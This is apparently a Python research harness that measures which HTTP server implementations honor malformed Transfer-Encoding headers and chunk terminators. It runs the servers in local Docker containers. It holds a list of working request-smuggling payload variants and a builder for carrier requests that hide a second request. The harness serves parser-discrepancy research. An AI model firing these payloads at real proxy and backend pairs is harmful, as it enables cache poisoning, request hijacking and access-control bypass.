#!/usr/bin/env python3
# Phage: HTTP framing honor matrix runner.
# License: Apache-2.0 License

"""Measure which HTTP implementations honor which malformed Transfer-Encoding, so a
smuggling pair can be predicted instead of guessed.

A desync is a disagreement between two parsers, so the exploitable question is never
"is this proxy vulnerable" but "does the backend behind it draw the message boundary
somewhere else". This measures the second half.

Signal: the number of HTTP response status lines the server emits for ONE carrier
request whose body contains a second, complete request after a zero-length chunk.
Two responses means the server de-chunked, honored Transfer-Encoding, and framed the
smuggled bytes as a request of their own. That is language-agnostic, so no
per-backend logging is needed.

Every row is gated on a per-backend CONTROL: an explicitly pipelined pair that any
correct server must answer with two responses. If the control does not produce two,
the counter cannot reach two on that backend and every verdict from it is discarded
as UNTRUSTED rather than reported as safe. A negative from an instrument that has
not been shown to produce a positive is not evidence of absence.

Usage:
  python matrix/run_matrix.py                 # every backend
  python matrix/run_matrix.py --only Node,Go  # substring filter
  python matrix/run_matrix.py --json out.json --md MATRIX.md
"""

import argparse
import json
import socket
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import NamedTuple, Optional

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from backends import BACKENDS  # noqa: E402

# one parser, shared with the package oracles; two copies means two answers
from phage.evo.http1 import _responses, _status_code  # noqa: E402

SMUGGLED = b"GET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n"
DEFAULT_BODY = b"0\r\n\r\n" + SMUGGLED


class Variant(NamedTuple):
    """One framing experiment: a header block, and optionally a body shape.

    `body` is the carrier's payload. Leave it None for the header experiments, where
    the question is which spelling of a value the server acts on. Set it when the
    disagreement is about what ENDS the body rather than what starts it, because the
    header is identical in those and only the terminator differs."""

    label: str
    header: bytes
    body: Optional[bytes] = None


# The framing experiments. The first group varies the VALUE of Transfer-Encoding: a
# server honoring plain `chunked` is behaving correctly, and the obfuscated spellings
# decide whether a lenient front end can be paired with it.
#
# The second group varies the SHAPE of the header block instead. RFC 9112 forbids
# whitespace before the colon and requires CRLF line terminators, so a parser that
# accepts either reads a different set of headers than the proxy in front of it did.
# That is the same disagreement one layer up from the value space.
#
# The third group varies the chunk TERMINATOR. The header says `chunked` in all of
# them; what moves is where the body ends.
VARIANTS = [
    Variant("chunked", b"Transfer-Encoding: chunked"),
    Variant("chunked<TAB>", b"Transfer-Encoding: chunked\t"),
    Variant("chunked<SP>", b"Transfer-Encoding: chunked "),
    Variant("chunked<VT>", b"Transfer-Encoding: chunked\x0b"),
    Variant("CHUNKED", b"Transfer-Encoding: CHUNKED"),
    Variant("chunked;a=b", b"Transfer-Encoding: chunked;a=b"),
    Variant("chunked, identity", b"Transfer-Encoding: chunked, identity"),
    Variant("identity, chunked", b"Transfer-Encoding: identity, chunked"),
    Variant("dup TE", b"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
    Variant("TE obs-fold", b"Transfer-Encoding: chunked\r\n\tidentity"),
    Variant("xchunked", b"Transfer-Encoding: xchunked"),
    Variant("TE ws-before-colon", b"Transfer-Encoding : chunked"),
    Variant("CL ws-before-colon", b"Content-Length : 4"),
    Variant("dup CL", b"Content-Length: 4"),
    Variant("bare-LF TE", b"X-Pad: 1\nTransfer-Encoding: chunked"),
    Variant(
        "chunk-ext terminator",
        b"Transfer-Encoding: chunked",
        b"0;a=b\r\n\r\n" + SMUGGLED,
    ),
    Variant("LF-only terminator", b"Transfer-Encoding: chunked", b"0\n\n" + SMUGGLED),
    Variant(
        "0x-prefixed size", b"Transfer-Encoding: chunked", b"0x0\r\n\r\n" + SMUGGLED
    ),
]

CONTAINER = "phage_matrix_target"  # suffixed per spec so specs can run side by side


def _send(port: int, payload: bytes, settle: float = 2.5):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=5)
    except OSError as exc:
        return None, f"connect failed: {exc}"
    try:
        s.sendall(payload)
        s.settimeout(settle)
        out = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
    except OSError:
        pass
    finally:
        s.close()
    return out, None


def build(hdr: bytes, body: Optional[bytes] = None) -> bytes:
    """One carrier request whose body hides a second request behind a zero-length chunk."""
    body = DEFAULT_BODY if body is None else body
    return (
        b"POST /carrier HTTP/1.1\r\nHost: lab\r\n"
        b"Content-Length: %d\r\n%s\r\n\r\n" % (len(body), hdr)
    ) + body


def probe(port: int, hdr: bytes, body: Optional[bytes] = None):
    return _send(port, build(hdr, body))


def control(port: int):
    """Two explicitly pipelined requests. A correct server answers with two responses.
    This proves the counter can reach two on THIS backend before any verdict is trusted."""
    req = (
        b"GET /ctl1 HTTP/1.1\r\nHost: lab\r\n\r\n"
        b"GET /ctl2 HTTP/1.1\r\nHost: lab\r\n\r\n"
    )
    return _send(port, req)


def trusted(ctl: bytes) -> bool:
    """Whether this backend's verdicts may be published at all.

    The control is two explicitly pipelined requests. A server that cannot answer them
    twice cannot make the counter reach two for any input, so its silence on the real
    variants says nothing about the server and everything about the instrument."""
    return bool(ctl) and _responses(ctl) >= 2


def classify(resp: bytes) -> str:
    """SMUGGLE  the backend framed the hidden request as a second request
    reject    it refused the message outright
    CL-safe   it framed exactly one request, reading the body by Content-Length"""
    if not resp:
        return "no-response"
    if _responses(resp) >= 2:
        return "SMUGGLE"
    code = _status_code(resp)
    if code is None:
        # The reply is not a parseable HTTP response. That is not a refusal and it is not
        # a clean single framing: it is a failure to measure, and naming it either would
        # be inventing a result. The old test was `b" 4" in first[:13]`, a substring probe
        # that reported "reject 4\xff\xfe" and even "reject " for junk, publishing a
        # rejection code the server never sent.
        return "unknown"
    if 400 <= code < 600:
        return f"reject {code}"
    return "CL-safe"


def container_for(spec) -> str:
    return f"{CONTAINER}_{spec['port']}"


def docker(*args, **kw):
    return subprocess.run(["docker", *args], capture_output=True, text=True, **kw)


def start(spec, out) -> bool:
    name = container_for(spec)
    docker("rm", "-f", name)
    # host networking + an explicit loopback bind inside the app: these toy servers must
    # never be reachable off-box.
    r = docker(
        "run",
        "-d",
        "--name",
        name,
        "--network",
        "host",
        spec["image"],
        "sh",
        "-c",
        spec["app"],
    )
    if r.returncode != 0:
        out.append(f"    docker run failed: {r.stderr.strip()[:200]}")
        return False
    for _ in range(int(spec.get("boot", 150))):
        try:
            socket.create_connection(("127.0.0.1", spec["port"]), timeout=1).close()
            time.sleep(1.0)  # let the server finish binding before the first probe
            return True
        except OSError:
            time.sleep(1.0)
    out.append("    timed out waiting for the port")
    return False


def run(spec) -> dict:
    row = {
        "name": spec["name"],
        "parser": spec["parser"],
        "results": {},
        "trusted": False,
    }
    # Buffer this spec's lines and emit them as one block. Under --jobs the specs
    # interleave, and a log where a verdict cannot be attributed to a backend is worse
    # than no log: the JSON stays correct while a reader draws the wrong conclusion.
    out = [f"  {spec['name']} ({spec['parser']})"]
    try:
        if not start(spec, out):
            row["error"] = "failed to start"
            return row
        try:
            ctl, err = control(spec["port"])
            row["control_responses"] = _responses(ctl) if ctl else 0
            row["trusted"] = trusted(ctl)
            if not row["trusted"]:
                out.append(
                    f"    CONTROL FAILED (responses={row['control_responses']}), "
                    "verdicts untrusted"
                )
            for v in VARIANTS:
                resp, err = probe(spec["port"], v.header, v.body)
                verdict = classify(resp) if not err else f"error: {err}"
                row["results"][v.label] = verdict
                out.append(f"    {v.label:20} {verdict}")
        finally:
            docker("rm", "-f", container_for(spec))
    finally:
        print("\n".join(out), flush=True)
    return row


def to_markdown(rows) -> str:
    heads = [v.label for v in VARIANTS]
    out = [
        "# HTTP framing honor matrix",
        "",
        "Which backend honors which malformed `Transfer-Encoding`, measured by counting the",
        "HTTP responses each server emits for one carrier request that hides a second request",
        "behind a zero-length chunk. **SMUGGLE** means the server framed the hidden request as",
        "a request of its own, so any front end that forwards this value can be paired with it",
        "for a desync.",
        "",
        "Every row is gated on a pipelining control that must produce two responses; a row that",
        "fails it is reported UNTRUSTED, never as safe.",
        "",
        "**What UNTRUSTED means.** Counting responses can only detect a second framed request on",
        "a connection the server keeps open. A backend that closes after one response cannot",
        "produce two, so the counter is structurally unable to reach a positive there and every",
        "verdict from it is withheld rather than reported as safe. That is a limit of this",
        "instrument, not a clean bill of health. It is also worth noting that such a backend is a",
        "poor smuggling target for the same reason: no connection reuse means no pooled",
        "connection to poison. To classify one properly, read what the application framed instead",
        "of what the socket returned.",
        "",
        "Generated by `python matrix/run_matrix.py`.",
        "",
        "| backend | parser | " + " | ".join(f"`{h}`" for h in heads) + " |",
        "|---|---|" + "---|" * len(heads),
    ]
    for r in rows:
        if r.get("error"):
            out.append(
                f"| {r['name']} | {r['parser']} | "
                + " | ".join(["n/a"] * len(heads))
                + " |"
            )
            continue
        cells = [r["results"].get(h, "?") for h in heads]
        name = r["name"] if r.get("trusted") else f"{r['name']} (UNTRUSTED)"
        out.append(f"| {name} | `{r['parser']}` | " + " | ".join(cells) + " |")
    smug = sorted(
        {r["name"] for r in rows if "SMUGGLE" in r.get("results", {}).values()}
    )
    out += ["", f"Backends that honor at least one variant: {len(smug)}.", ""]
    return "\n".join(out)


def prepull(specs) -> None:
    """Fetch every image up front, in parallel. Otherwise the first probe of a cold
    image is racing a download against the boot timeout, and a slow link looks like a
    backend that would not start."""
    images = sorted({s["image"] for s in specs})
    print(f"pre-pulling {len(images)} image(s)")
    with ThreadPoolExecutor(max_workers=len(images)) as pool:
        for img, r in zip(images, pool.map(lambda i: docker("pull", "-q", i), images)):
            if r.returncode != 0:
                print(f"  pull failed: {img}: {r.stderr.strip()[:120]}")


def main() -> int:
    ap = argparse.ArgumentParser(description="HTTP framing honor matrix")
    ap.add_argument("--only", help="comma-separated substrings of backend names")
    ap.add_argument("--json", default="matrix/results.json")
    ap.add_argument("--md", default="matrix/MATRIX.md")
    ap.add_argument(
        "--jobs",
        type=int,
        default=1,
        help="measure this many backends at once (each binds its own port)",
    )
    args = ap.parse_args()

    specs = BACKENDS
    if args.only:
        want = [s.strip().lower() for s in args.only.split(",")]
        specs = [s for s in specs if any(w in s["name"].lower() for w in want)]
    if not specs:
        print("no backends matched")
        return 1

    print(f"measuring {len(specs)} backend(s), jobs={args.jobs}")
    prepull(specs)
    if args.jobs > 1:
        with ThreadPoolExecutor(max_workers=args.jobs) as pool:
            rows = list(pool.map(run, specs))
    else:
        rows = [run(s) for s in specs]

    Path(args.json).parent.mkdir(parents=True, exist_ok=True)
    Path(args.json).write_text(json.dumps(rows, indent=2) + "\n")
    Path(args.md).write_text(to_markdown(rows))
    print(f"\nwrote {args.json} and {args.md}")
    untrusted = [r["name"] for r in rows if not r.get("trusted") and not r.get("error")]
    if untrusted:
        print(f"UNTRUSTED rows (control did not reach two): {', '.join(untrusted)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
